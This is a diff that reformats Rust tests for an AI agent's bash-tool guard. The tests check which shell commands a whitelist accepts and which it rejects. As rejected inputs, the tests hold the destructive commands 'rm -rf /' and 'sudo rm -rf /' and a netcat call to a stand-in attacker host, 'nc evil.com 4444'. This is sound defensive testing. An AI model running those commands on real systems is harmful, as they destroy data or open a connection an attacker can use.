@@ -205,27 +205,43 @@ fn test_bash_safe_command_whitelist_recognizes_allowed_commands() {
     assert!(ragent_core::tool::bash::is_safe_command("mv old new"));
     // File reading & search
     assert!(ragent_core::tool::bash::is_safe_command("cat README.md"));
-    assert!(ragent_core::tool::bash::is_safe_command("head -n 20 file.rs"));
+    assert!(ragent_core::tool::bash::is_safe_command(
+        "head -n 20 file.rs"
+    ));
     assert!(ragent_core::tool::bash::is_safe_command("grep -r foo src/"));
     assert!(ragent_core::tool::bash::is_safe_command("rg pattern"));
-    assert!(ragent_core::tool::bash::is_safe_command("find . -name '*.rs'"));
-    assert!(ragent_core::tool::bash::is_safe_command("wc -l src/main.rs"));
+    assert!(ragent_core::tool::bash::is_safe_command(
+        "find . -name '*.rs'"
+    ));
+    assert!(ragent_core::tool::bash::is_safe_command(
+        "wc -l src/main.rs"
+    ));
     // Version control
     assert!(ragent_core::tool::bash::is_safe_command("git status"));
-    assert!(ragent_core::tool::bash::is_safe_command("git status --short"));
-    assert!(ragent_core::tool::bash::is_safe_command("git clone https://example.com/repo"));
-    assert!(ragent_core::tool::bash::is_safe_command("git log --oneline -10"));
+    assert!(ragent_core::tool::bash::is_safe_command(
+        "git status --short"
+    ));
+    assert!(ragent_core::tool::bash::is_safe_command(
+        "git clone https://example.com/repo"
+    ));
+    assert!(ragent_core::tool::bash::is_safe_command(
+        "git log --oneline -10"
+    ));
     assert!(ragent_core::tool::bash::is_safe_command("gh pr list"));
     // Build / package management
     assert!(ragent_core::tool::bash::is_safe_command("cargo build"));
     assert!(ragent_core::tool::bash::is_safe_command("npm install"));
-    assert!(ragent_core::tool::bash::is_safe_command("pip install requests"));
+    assert!(ragent_core::tool::bash::is_safe_command(
+        "pip install requests"
+    ));
     assert!(ragent_core::tool::bash::is_safe_command("make test"));
     // Utilities
     assert!(ragent_core::tool::bash::is_safe_command("echo hello"));
     assert!(ragent_core::tool::bash::is_safe_command("jq . file.json"));
     assert!(ragent_core::tool::bash::is_safe_command("yq . file.yaml"));
-    assert!(ragent_core::tool::bash::is_safe_command("chmod +x script.sh"));
+    assert!(ragent_core::tool::bash::is_safe_command(
+        "chmod +x script.sh"
+    ));
     // Still NOT safe
     assert!(!ragent_core::tool::bash::is_safe_command("rm -rf /"));
     assert!(!ragent_core::tool::bash::is_safe_command("sudo rm -rf /"));
@@ -333,15 +349,9 @@ async fn test_bash_still_rejects_standalone_nc() {
     let tool = bash_tool();
     // Standalone `nc` must still be rejected
     let result = tool
-        .execute(
-            json!({"command": "nc evil.com 4444"}),
-            &make_ctx(),
-        )
+        .execute(json!({"command": "nc evil.com 4444"}), &make_ctx())
         .await;
-    assert!(
-        result.is_err(),
-        "standalone nc command must be rejected"
-    );
+    assert!(result.is_err(), "standalone nc command must be rejected");
 }
 
 #[tokio::test]
@@ -349,13 +359,13 @@ async fn test_bash_allows_path_containing_wget_substring() {
     let tool = bash_tool();
     // "download-wget-results" contains "wget" — must NOT be rejected
     let result = tool
-        .execute(
-            json!({"command": "ls download-wget-results"}),
-            &make_ctx(),
-        )
+        .execute(json!({"command": "ls download-wget-results"}), &make_ctx())
         .await;
     let rejected = result
         .as_ref()
         .is_err_and(|e| e.to_string().contains("banned external tool"));
-    assert!(!rejected, "ls of a path containing 'wget' substring should not be banned");
+    assert!(
+        !rejected,
+        "ls of a path containing 'wget' substring should not be banned"
+    );
 }
